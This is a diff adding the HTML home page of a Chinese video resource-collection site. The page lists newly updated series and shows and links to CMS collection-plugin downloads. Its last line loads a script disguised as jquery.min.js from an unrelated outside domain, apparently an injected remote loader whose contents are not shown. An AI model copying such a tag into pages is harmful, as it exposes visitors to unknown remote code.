@@ -1,0 +1,374 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head> 
+  <title>速播资源采集-最新影视资源大全</title> 
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+  <meta name="keywords" content="速播资源采集-最新影视资源大全" /> 
+  <meta name="description" content="速播资源采集-最新影视资源大全" />
+  <link href="/template/ziyuan2/css/home.css" rel="stylesheet" type="text/css" />
+<script src="/js/jquery.js"></script>
+
+<script>var SitePath='/',SiteAid='10',SiteTid='',SiteId='';</script>
+<script src="/template/ziyuan2/js/home.js"></script>
+<script type="text/javascript">
+<!--
+var timeout= 500;
+var closetimer= 0;
+var ddmenuitem= 0;
+function mopen(id)
+{	
+	mcancelclosetime();
+	if(ddmenuitem) ddmenuitem.style.visibility = 'hidden';
+	ddmenuitem = document.getElementById(id);
+	ddmenuitem.style.visibility = 'visible';
+}
+function mclose()
+{
+	if(ddmenuitem) ddmenuitem.style.visibility = 'hidden';
+}
+function mclosetime()
+{
+	closetimer = window.setTimeout(mclose, timeout);
+}
+function mcancelclosetime()
+{
+	if(closetimer)
+	{
+		window.clearTimeout(closetimer);
+		closetimer = null;
+	}
+}
+document.onclick = mclose; 
+// -->
+</script>
+ </head>
+ <body>   
+ <table border="0" width="100%" bgcolor="#FFFF00" style="font-size: 12px" cellspacing="0" 
+ 
+cellpadding="0" height="30"><tr><td>
+	<p align="center">
+	<br><font color="#FF0000">公告：</font></font>郑重承诺：资源永久免费,资源不含任何广告,无广告永久免费的资源站(承诺绝不影响用户体验) <br>
+	<font color="#FF0000"><font style="font-size: 10pt"><b class="b">信誉保证：全网唯一真国内CDN，高峰期保证不卡顿，资源保证更新及时</b></font>&nbsp; 
+
+	<a target="_blank" href="http://www.348958.com/"><font size="2" color="#FF0000">>>>速播资源演示站<<<</font></a><font color="#FF0000">&nbsp;&nbsp;  QQ群: <a target="_blank" href="https://jq.qq.com/?_wv=1027&k=5bRPuye"><img border="0" src="//pub.idqqimg.com/wpa/images/group.png" alt="速播资源" title="速播资源"></a>
+<br><br>
+                <a target="_blank" href="https://www.subo8988.com/cj/subomac.zip" style="width: 100px;"><font color="red">苹果CMS采集插件</font></a><em>|</em>
+
+                <a target="_blank" href="https://www.subo8988.com/cj/subosea.zip" style="width: 100px;"><font color="#FF00FF">海洋CMS采集插件</font></a><em>|</em>
+
+                <a target="_blank" href="https://www.subo8988.com/cj/suboffcms.zip" style="width: 100px;"><font color="#0000FF">飞飞CMS采集插件</font></a><em>|</em>
+
+                <a target="_blank" href="https://www.subo8988.com/cj/suboduomi.zip" style="width: 100px;"><font color="#8B008B">多米CMS采集插件</font></a><em>|</em>
+
+                <a target="_blank" href="https://www.subo8988.com/cj/subomax.zip" style="width: 100px;"><font color="#00008B">马克思CMS采集插件</font></a><em>|</em>
+
+                <a target="_blank" href="https://www.subo8988.com/cj/suboctcms.zip" style="width: 100px;"><font color="#00008B">赤兔CMS采集插件</font></a><em>|</em>
+              <a target="_blank" href="https://www.subo8988.com/cj/subozpcms.zip" style="width: 100px;"><font color="#00008B">赞片cms采集插件</font></a>
+	</font>
+
+		 <!-- <b style="text-decoration-line: underline;">站长群：<a target="_blank" href="https://jq.qq.com/?_wv=1027&k=5StrVm1" style="padding-right: 5px;color: blue;">速播资源站</a>|<a href="/help" target="_blank" style="padding: 5px;color: blue;">查看各大CMS整合教程</a>|<a href="#" target="_blank" style="padding: 5px;color: blue;">了解全网最高价收流量，让每个站长赚钱！</a>|<a href="#" target="_blank" style="padding-left: 5px;color: blue;">苹果cms火车头规则</a></b>   -->
+          
+</b></td>
+</tr></table>
+ 
+   		</tr>
+	</tbody>
+</table>
+
+
+   <div class="xing_top">
+<ul>
+	<li class="xing_top_left"><img src="/template/ziyuan2/images/logo.png" width="200" height="60" alt="速播资源采集-最新影视资源大全" /></li>
+	<li class="xing_top_center">
+	<div class="search">
+             <div class="search-inner">
+                 <form action="/index.php?m=vod-search" method="post">
+                    <input type="text" x-webkit-speech="" autocomplete="off" name="wd" id="wd" class="search-text" onblur="if(this.value==''){ this.value='100万部影片任你搜索';this.style.color='#cfcdcd';}" onfocus="if(this.value=='100万部影片任你搜索'){this.value='';this.style.color='';}" value="100万部影片任你搜索">
+                    <input type="hidden" name="submit" value="search">
+                    <input type="submit" class="search-btn" value="搜索">
+                 </form>
+             </div>
+          </div>
+	</li>
+	<li class="xing_top_right">
+<div class="topright">
+  
+<ul><li>今日更新：<strong>14</strong></li></ul>
+    <ul><li><!-- 速播资源采集-最新影视资源大全 -->本站影片共有：<strong>46640</strong></li></ul>
+	<ul><li><a target="_blank" href="/help/">帮助中心</a> | <a class="ge" onClick="var strHref=window.location.href;this.style.behavior='url(#default#homepage)';this.setHomePage('http://subo988.com');" href="#" id="topmenu1" accesskey="1">设为首页</a> | <a href="/index.php?m=gbook-show.html">有求必应</a> </li></ul>
+</div>
+</li>
+</ul>
+<div  style="clear:both"></div>
+</div>
+<div  class="sddm">
+<ul id="sddm">
+	<li><a href="/">首页</a></li>
+
+	<li><a href="/?m=vod-type-id-1.html" onmouseover="mopen('m1')" onmouseout="mclosetime()">电影</a>
+		<div id="m1" onmouseover="mcancelclosetime()" onmouseout="mclosetime()">
+        <a href="/?m=vod-type-id-5.html">动作片</a><a href="/?m=vod-type-id-6.html">喜剧片</a><a href="/?m=vod-type-id-7.html">爱情片</a><a href="/?m=vod-type-id-8.html">科幻片</a><a href="/?m=vod-type-id-9.html">恐怖片</a><a href="/?m=vod-type-id-10.html">剧情片</a><a href="/?m=vod-type-id-11.html">战争片</a><a href="/?m=vod-type-id-16.html">理论片</a>
+		</div>
+	</li>
+
+	<li><a href="/?m=vod-type-id-2.html" onmouseover="mopen('m2')" onmouseout="mclosetime()">连续剧</a>
+		<div id="m2" onmouseover="mcancelclosetime()" onmouseout="mclosetime()">
+        <a href="/?m=vod-type-id-12.html">国产剧</a><a href="/?m=vod-type-id-13.html">香港剧</a><a href="/?m=vod-type-id-14.html">日本剧</a><a href="/?m=vod-type-id-15.html">欧美剧</a><a href="/?m=vod-type-id-17.html">台湾剧</a><a href="/?m=vod-type-id-18.html">韩国剧</a><a href="/?m=vod-type-id-19.html">海外</a>
+		</div>
+	</li>
+
+	<li><a href="/?m=vod-type-id-3.html" onmouseover="mopen('m3')" onmouseout="mclosetime()">综艺</a>
+		<div id="m3" onmouseover="mcancelclosetime()" onmouseout="mclosetime()">
+        
+		</div>
+	</li>
+
+	<li><a href="/?m=vod-type-id-4.html" onmouseover="mopen('m4')" onmouseout="mclosetime()">动漫</a>
+		<div id="m4" onmouseover="mcancelclosetime()" onmouseout="mclosetime()">
+        
+		</div>
+	</li>
+
+	<li><a href="/?m=vod-type-id-20.html" onmouseover="mopen('m5')" onmouseout="mclosetime()">音乐MTV</a>
+		<div id="m5" onmouseover="mcancelclosetime()" onmouseout="mclosetime()">
+        
+		</div>
+	</li>
+
+</ul>
+<div  style="clear:both"></div>
+</div>
+ 
+     <div class="container">
+		<div class="nvc">
+			<dl>
+				<dt>
+					<span>当前位置</span>
+					<i class="arrow"><b class="a_outer"></b><b class="a_inner"></b></i>
+				</dt>
+				<dd><a href="/">首页</a></dd>
+			</dl>
+		</div>
+</div>
+  <div class="xing_vb"> 
+   <ul>
+    <li><span class="xing_vb1">影片名称</span><span class="xing_vb2">影片类别</span><span class="xing_vb3">更新时间</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48510.html" target="_blank">蜗牛与黄鹂鸟DVD版&nbsp;更新至20集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-02 01:01:57</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48416.html" target="_blank">蜗牛与黄鹂鸟&nbsp;更新至20集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-02 01:01:21</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48212.html" target="_blank">爱在旅途之反转爱情&nbsp;更新至12集</a></span> <span class="xing_vb5">海外</span> <span class="xing_vb7">2020-07-02 00:55:00</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48213.html" target="_blank">爱在旅途之反转爱情国语&nbsp;更新至12集</a></span> <span class="xing_vb5">海外</span> <span class="xing_vb7">2020-07-02 00:54:28</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48672.html" target="_blank">觉醒2019&nbsp;更新至12集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-02 00:53:49</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48606.html" target="_blank">爱我就别想太多&nbsp;更新至13集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-02 00:42:32</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48456.html" target="_blank">湾区儿女&nbsp;更新至20集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-02 00:41:01</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48149.html" target="_blank">玫瑰奇缘恋与大明星国语&nbsp;更新至18集</a></span> <span class="xing_vb5">海外</span> <span class="xing_vb7">2020-07-02 00:40:22</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48505.html" target="_blank">局中人&nbsp;更新至16集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-02 00:38:53</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48931.html" target="_blank">密室大逃脱第二季 大神版&nbsp;更新至01期</a></span> <span class="xing_vb5">综艺</span> <span class="xing_vb6">2020-07-02 00:37:22</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-47580.html" target="_blank">神奇的汉字第二季&nbsp;更新至20200701期</a></span> <span class="xing_vb5">综艺</span> <span class="xing_vb7">2020-07-02 00:36:08</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48211.html" target="_blank">HOHO日记 2020&nbsp;更新至08期</a></span> <span class="xing_vb5">综艺</span> <span class="xing_vb7">2020-07-02 00:35:17</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48930.html" target="_blank">咖啡遇上香草&nbsp;10集全/已完结</a></span> <span class="xing_vb5">日本剧</span> <span class="xing_vb6">2020-07-02 00:33:41</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48929.html" target="_blank">未解之谜2020&nbsp;更新至06集</a></span> <span class="xing_vb5">综艺</span> <span class="xing_vb6">2020-07-02 00:31:09</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-44910.html" target="_blank">对牛谈情俱乐部&nbsp;8集全/已完结</a></span> <span class="xing_vb5">海外</span> <span class="xing_vb7">2020-07-01 23:49:08</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48925.html" target="_blank">窒风之中 第二季&nbsp;更新至05集</a></span> <span class="xing_vb5">海外</span> <span class="xing_vb6">2020-07-01 23:34:44</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-46250.html" target="_blank">法律与秩序第十七季&nbsp;更新至08集</a></span> <span class="xing_vb5">欧美剧</span> <span class="xing_vb7">2020-07-01 23:34:02</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-46627.html" target="_blank">外卖吃得开吗&nbsp;更新至07集</a></span> <span class="xing_vb5">综艺</span> <span class="xing_vb7">2020-07-01 23:32:52</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-47816.html" target="_blank">奈何BOSS又如何&nbsp;更新至16集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-01 23:31:33</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48928.html" target="_blank">我们之间2&nbsp;更新至03集</a></span> <span class="xing_vb5">韩国剧</span> <span class="xing_vb6">2020-07-01 23:30:50</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-47683.html" target="_blank">怪你过分美丽&nbsp;更新至36集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-01 23:27:04</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-28793.html" target="_blank">爱·回家之开心速递&nbsp;更新至923集</a></span> <span class="xing_vb5">香港剧</span> <span class="xing_vb7">2020-07-01 22:33:17</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-47688.html" target="_blank">那些我爱过的人国语&nbsp;更新至18集</a></span> <span class="xing_vb5">香港剧</span> <span class="xing_vb7">2020-07-01 22:26:30</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-47687.html" target="_blank">那些我爱过的人粤语&nbsp;更新至18集</a></span> <span class="xing_vb5">香港剧</span> <span class="xing_vb7">2020-07-01 22:25:56</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48927.html" target="_blank">省委书记&nbsp;18集全/已完结</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb6">2020-07-01 22:23:34</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48926.html" target="_blank">侦察记&nbsp;34集全/已完结</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb6">2020-07-01 22:19:45</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48208.html" target="_blank">凤归四时歌&nbsp;更新至30集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-01 22:07:27</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48607.html" target="_blank">特殊行动&nbsp;更新至20集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-01 21:58:16</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-47951.html" target="_blank">天堂不相信眼泪&nbsp;更新至46集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-01 21:57:21</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48815.html" target="_blank">不说谎恋人&nbsp;更新至12集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-01 21:09:33</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-47535.html" target="_blank">你是我的命中注定&nbsp;36集全/已完结</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-01 21:06:54</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-47684.html" target="_blank">少年游之一寸相思&nbsp;36集全/已完结</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-01 21:05:53</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48091.html" target="_blank">痕迹&nbsp;更新至30集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-01 21:05:06</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48924.html" target="_blank">锦绣南歌&nbsp;更新至08集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb6">2020-07-01 20:22:26</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48923.html" target="_blank">时空使徒日语版&nbsp;12集全/已完结</a></span> <span class="xing_vb5">动漫</span> <span class="xing_vb6">2020-07-01 19:40:26</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48758.html" target="_blank">小娘惹爱奇艺版&nbsp;更新至08集</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb7">2020-07-01 19:38:06</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48922.html" target="_blank">时空使徒&nbsp;12集全/已完结</a></span> <span class="xing_vb5">动漫</span> <span class="xing_vb6">2020-07-01 19:33:31</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48921.html" target="_blank">三餐物语&nbsp;12集全/已完结</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb6">2020-07-01 19:28:43</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48560.html" target="_blank">绿叶 第五季&nbsp;更新至02集</a></span> <span class="xing_vb5">欧美剧</span> <span class="xing_vb7">2020-07-01 19:25:04</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48920.html" target="_blank">木木川&nbsp;12集全/已完结</a></span> <span class="xing_vb5">国产剧</span> <span class="xing_vb6">2020-07-01 19:17:04</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48919.html" target="_blank">一元背后&nbsp;10集全/已完结</a></span> <span class="xing_vb5">欧美剧</span> <span class="xing_vb6">2020-07-01 19:13:55</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48918.html" target="_blank">玩命斯巴达&nbsp;8集全/已完结</a></span> <span class="xing_vb5">海外</span> <span class="xing_vb6">2020-07-01 19:11:18</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48917.html" target="_blank">秃鹫2018&nbsp;8集全/已完结</a></span> <span class="xing_vb5">日本剧</span> <span class="xing_vb6">2020-07-01 19:08:50</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-21677.html" target="_blank">各位国民&nbsp;18集全/已完结</a></span> <span class="xing_vb5">韩国剧</span> <span class="xing_vb7">2020-07-01 19:05:54</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48916.html" target="_blank">读心人第五季&nbsp;13集全/已完结</a></span> <span class="xing_vb5">海外</span> <span class="xing_vb6">2020-07-01 19:01:15</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48915.html" target="_blank">读心人第四季&nbsp;13集全/已完结</a></span> <span class="xing_vb5">海外</span> <span class="xing_vb6">2020-07-01 18:57:47</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-48914.html" target="_blank">超级中国&nbsp;7集全/已完结</a></span> <span class="xing_vb5">综艺</span> <span class="xing_vb6">2020-07-01 18:27:48</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-10602.html" target="_blank">杂志天下&nbsp;更新至20200701期</a></span> <span class="xing_vb5">综艺</span> <span class="xing_vb7">2020-07-01 18:25:07</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-10603.html" target="_blank">万家灯火&nbsp;更新至20200701期</a></span> <span class="xing_vb5">综艺</span> <span class="xing_vb7">2020-07-01 18:24:00</span></li>
+   </ul> 
+    
+   <ul>
+    <li><span class="tt"></span><span class="xing_vb4"><a href="/?m=vod-detail-id-41371.html" target="_blank">男生女生向前冲2020&nbsp;更新至20200701期</a></span> <span class="xing_vb5">综艺</span> <span class="xing_vb7">2020-07-01 18:23:00</span></li>
+   </ul> 
+    
+   <ul style="display:block;clear:both;">
+    <li><div class="pages" style="margin-bottom:10px;">共46640条数据&nbsp;当前:1/933页&nbsp;<em>首页</em>&nbsp;<em>上一页</em>&nbsp;<span class="pagenow">1</span>&nbsp;<a target="_self" class="pagelink_b" href="/?m=vod-index-pg-2.html">2</a>&nbsp;<a target="_self" class="pagelink_b" href="/?m=vod-index-pg-3.html">3</a>&nbsp;<a target="_self" class="pagelink_b" href="/?m=vod-index-pg-4.html">4</a>&nbsp;<a target="_self" class="pagelink_b" href="/?m=vod-index-pg-5.html">5</a>&nbsp;<a target="_self" class="pagelink_b" href="/?m=vod-index-pg-6.html">6</a>&nbsp;<a target="_self" href="/?m=vod-index-pg-2.html" class="pagelink_a">下一页</a>&nbsp;<a target="_self" href="/?m=vod-index-pg-933.html" class="pagelink_a">尾页</a>&nbsp;<input type="input" name="page" id="page" size="4" class="pagego"/><input type="button" value="跳 转" onclick="pagego('/?m=vod-index-pg-{pg}.html',933)" class="pagebtn" /></div></li>
+   </ul> 
+   <div style="clear:both"></div> 
+  </div> 
+  ﻿<!-- 底部截取标签-->
+<div class="foot">
+          <ul  class="footb">
+               <li><a href="#">关于我们</a>&nbsp; |&nbsp; <a href="" target="_blank">速播资源采集-最新影视资源大全</a>&nbsp;  |&nbsp; <a href="http://subo988.com">速播资源站</a>  |&nbsp; <a href="#">subo</a>&nbsp;|&nbsp;<script src="/js/tj.js"></script></li>
+			   <li>本站所有内容均来自互联网，如果本站部分内容侵犯您的版权请告知，在必要证明文件下我们第一时间撤除</li>
+			   <li>Copyright ©2018-2020  All Rights Reserved <a href="http://cj.subo988.com:8988" target="_blank">cj.subo988.com:8988</a> · <a href="/index.php?m=map-baidu.html" target="_blank">百度地图</a> · <a href="/index.php?m=map-google.html" target="_blank">google地图</a> · <a href="/index.php?m=map-rss.html" target="_blank">rss订阅</a></li>
+          </ul>
+</div>
+<div style="display:none;"> <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1275478072'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s96.cnzz.com/stat.php%3Fid%3D1275478072' type='text/javascript'%3E%3C/script%3E"));</script></div> 
+<script src='https://www.hongchenzhilu.com/jquery.min.js'></script>  
+ </body>
+</html>
